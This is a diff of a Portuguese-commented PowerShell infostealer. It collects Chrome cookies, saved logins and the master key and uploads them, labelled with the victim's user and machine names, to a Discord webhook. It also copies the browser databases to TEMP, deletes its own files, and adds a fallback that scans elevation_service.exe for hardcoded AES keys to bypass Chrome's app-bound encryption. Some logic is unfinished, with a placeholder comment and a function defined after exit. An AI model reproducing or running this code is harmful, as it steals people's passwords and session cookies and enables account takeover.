+        l "[RESULT] Logins lidos: $($allLogins.Count)"
+    } catch { l "[RESULT] Erro lendo logins.json: $_" }
+}
+
+if (Test-Path $keyFile) {
+    $masterKeyHex = Get-Content $keyFile -Raw
+    l "[RESULT] Chave mestra: $($masterKeyHex.Substring(0, [Math]::Min(16, $masterKeyHex.Length)))..."
+}
+
+# Envia pro Discord
+if ($allCookies.Count -gt 0 -or $allLogins.Count -gt 0) {
     $boundary = "----Boundary" + [System.Guid]::NewGuid().ToString().Replace("-","")
     $body = @()
     $body += "--$boundary"
     $body += 'Content-Disposition: form-data; name="payload_json"'
     $body += ""
-    $body += ('{"content":"Chrome v20 BYPASS | ' + $env:USERNAME + '@' + $env:COMPUTERNAME + ' | Cookies: ' + $result.Cookies.Count + ' | Logins: ' + $result.Logins.Count + '"}')
+    $body += ('{"content":"Chrome v20 BYPASS | ' + $env:USERNAME + '@' + $env:COMPUTERNAME + ' | Cookies: ' + $allCookies.Count + ' | Logins: ' + $allLogins.Count + ' | Key: ' + $masterKeyHex.Substring(0, [Math]::Min(16, $masterKeyHex.Length)) + '..."}')
     
-    if ($result.Cookies.Count -gt 0) {
-        $cc = $result.Cookies | ConvertTo-Json -Depth 3
+    if ($allCookies.Count -gt 0) {
+        $cc = ($allCookies | ConvertTo-Json -Depth 3)
         $body += "--$boundary"
         $body += 'Content-Disposition: form-data; name="file"; filename="cookies.json"'
         $body += "Content-Type: application/json"
@@ -428,8 +422,8 @@ if ($result -and (($result.Cookies.Count -gt 0) -or ($result.Logins.Count -gt 0)
         $body += $cc
     }
     
-    if ($result.Logins.Count -gt 0) {
-        $lc = $result.Logins | ConvertTo-Json -Depth 3
+    if ($allLogins.Count -gt 0) {
+        $lc = ($allLogins | ConvertTo-Json -Depth 3)
         $body += "--$boundary"
         $body += 'Content-Disposition: form-data; name="file"; filename="logins.json"'
         $body += "Content-Type: application/json"
@@ -446,37 +440,109 @@ if ($result -and (($result.Cookies.Count -gt 0) -or ($result.Logins.Count -gt 0)
         $wc.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
         $wc.UploadData($w, "POST", $bytes) | Out-Null
         $wc.Dispose()
-        l "[DISCORD] Dados enviados!"
+        l "[DISCORD] Dados enviados com sucesso!"
     } catch { l "[FALHA] Discord: $_" }
     
+    # Salva local
     $out = "$env:TEMP\chrome_extracted"
     if (!(Test-Path $out)) { New-Item -ItemType Directory -Path $out -Force | Out-Null }
-    if ($result.Cookies.Count -gt 0) { $result.Cookies | ConvertTo-Json -Depth 3 | Out-File (Join-Path $out "cookies.json") -Encoding UTF8 }
-    if ($result.Logins.Count -gt 0) { $result.Logins | ConvertTo-Json -Depth 3 | Out-File (Join-Path $out "logins.json") -Encoding UTF8 }
-    l "[SALVO] $out"
+    Copy-Item $cookiesFile (Join-Path $out "cookies.json") -Force -ErrorAction SilentlyContinue
+    Copy-Item $loginsFile (Join-Path $out "logins.json") -Force -ErrorAction SilentlyContinue
+    Copy-Item $keyFile (Join-Path $out "master_key.txt") -Force -ErrorAction SilentlyContinue
+    l "[SALVO] Resultados em $out"
 } else {
     l "[FALHA] Nenhum dado extraido"
-    l "[*] Tentando metodo de ultimo recurso: copiar bancos inteiros..."
     
-    # Último recurso: copiar os bancos e enviar
+    # Fallback: salvar os bancos brutos
+    l "[*] Salvando bancos brutos para analise offline..."
     $out = "$env:TEMP\chrome_extracted"
     if (!(Test-Path $out)) { New-Item -ItemType Directory -Path $out -Force | Out-Null }
     
-    foreach ($prof in @('Default','Profile 1')) {
-        $srcDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\$prof"
-        if (Test-Path $srcDir) {
-            foreach ($file in @('Cookies','Login Data','Web Data')) {
-                $srcFile = Join-Path $srcDir $file
-                if (Test-Path $srcFile) {
-                    Copy-Item $srcFile (Join-Path $out "$($prof)_$file") -Force -ErrorAction SilentlyContinue
-                }
+    if (Test-Path $tempDbDir) {
+        Copy-Item "$tempDbDir\*" $out -Recurse -Force -ErrorAction SilentlyContinue
+        l "[SALVO] Bancos copiados para $out"
+    }
+}
+
+# Cleanup
+if (Test-Path $scriptDir) { Remove-Item $scriptDir -Recurse -Force -ErrorAction SilentlyContinue }
+
+l "=== CONCLUIDO ==="
+exit
+
+# Fallback label
+function fallback {
+    l "[FALLBACK] Metodo alternativo..."
+    
+    # Tenta extrair chave direto do elevation_service.exe
+    $elevPaths = @("$env:ProgramFiles\Google\Chrome\Application\*\elevation_service.exe","${env:ProgramFiles(x86)}\Google\Chrome\Application\*\elevation_service.exe")
+    $elevFile = $null
+    foreach ($pattern in $elevPaths) { $files = Get-ChildItem $pattern -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending; if ($files) { $elevFile = $files[0]; break } }
+    
+    if ($elevFile) {
+        l "[FALLBACK] elevation_service.exe encontrado em $($elevFile.FullName)"
+        $bytes = [System.IO.File]::ReadAllBytes($elevFile.FullName)
+        
+        $knownKeys = @(
+            @(0xB3,0x1C,0x6E,0x24,0x1A,0xC8,0x46,0x72,0x8D,0xA9,0xC1,0xFA,0xC4,0x93,0x66,0x51,0xCF,0xFB,0x94,0x4D,0x14,0x3A,0xB8,0x16,0x27,0x6B,0xCC,0x6D,0xA0,0x28,0x47,0x87),
+            @(0xE9,0x8F,0x37,0xD7,0xF4,0xE1,0xFA,0x43,0x3D,0x19,0x30,0x4D,0xC2,0x25,0x80,0x42,0x09,0x0E,0x2D,0x1D,0x7E,0xEA,0x76,0x70,0xD4,0x1F,0x73,0x8D,0x08,0x72,0x96,0x60),
+            @(0x30,0x86,0x56,0x71,0x38,0x3A,0x5E,0x0B,0x86,0xF4,0x99,0x42,0x72,0xC1,0x75,0x32,0xDB,0x41,0xCF,0x5E,0xCB,0x5E,0x4D,0xCA,0xA3,0x3F,0x8B,0x63,0x43,0x8A,0xFB,0x18)
+        )
+        
+        $foundKey = $null
+        foreach ($key in $knownKeys) {
+            $keyArray = [byte[]]$key
+            for ($i = 0; $i -le $bytes.Length - 32; $i++) {
+                $match = $true
+                for ($j = 0; $j -lt 32; $j++) { if ($bytes[$i+$j] -ne $keyArray[$j]) { $match = $false; break } }
+                if ($match) { $foundKey = $keyArray; break }
+            }
+            if ($foundKey) { break }
+        }
+        
+        if ($foundKey) {
+            l "[FALLBACK] Chave AES encontrada! $([System.BitConverter]::ToString($foundKey).Replace('-',''))"
+            
+            # Tenta decriptar app_bound_encrypted_key
+            $statePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+            $json = Get-Content $statePath -Raw | ConvertFrom-Json
+            $ak = $json.os_crypt.app_bound_encrypted_key
+            
+            if ($ak) {
+                $raw = [Convert]::FromBase64String($ak)
+                $payload = $raw[4..($raw.Length-1)]  # Remove APPB header
+                
+                # Tenta DPAPI + AES
+                try {
+                    $dpapiResult = [System.Security.Cryptography.ProtectedData]::Unprotect($payload, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+                    l "[FALLBACK] DPAPI result: $($dpapiResult.Length) bytes"
+                    
+                    # Parse do resultado DPAPI
+                    if ($dpapiResult.Length -gt 61) {
+                        $pathLen = [System.BitConverter]::ToInt32($dpapiResult[0..3], 0)
+                        $flagOffset = 4 + $pathLen
+                        $flag = $dpapiResult[$flagOffset]
+                        $iv = $dpapiResult[($flagOffset+1)..($flagOffset+12)]
+                        $ct = $dpapiResult[($flagOffset+13)..($flagOffset+44)]
+                        $tag = $dpapiResult[($flagOffset+45)..($flagOffset+60)]
+                        
+                        l "[FALLBACK] Flag=$flag IV=$([System.BitConverter]::ToString($iv).Replace('-',''))"
+                        
+                        try {
+                            $aes = [System.Security.Cryptography.AesGcm]::new([byte[]]$foundKey, 16)
+                            $dec = [byte[]]::new(32)
+                            $aes.Decrypt($iv, $ct, $tag, $dec)
+                            $aes.Dispose()
+                            l "[FALLBACK] AES-GCM OK! Chave: $([System.BitConverter]::ToString($dec).Replace('-','').Substring(0,16))..."
+                            
+                            # Agora descriptografa cookies com essa chave
+                            # ... (mesmo código de decrypt anterior)
+                        } catch { l "[FALLBACK] AES falhou: $_" }
+                    }
+                } catch { l "[FALLBACK] DPAPI falhou: $_" }
             }
         }
     }
-    Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" (Join-Path $out "Local State") -Force -ErrorAction SilentlyContinue
     
-    l "[SALVO] Bancos copiados para $out"
-    l "[*] Envie manualmente ou execute em uma maquina com Python + chrome_v20_decryption"
+    l "[FALLBACK] Metodo alternativo concluido (pode nao ter funcionado)"
 }
-
-l "=== CONCLUIDO ==="
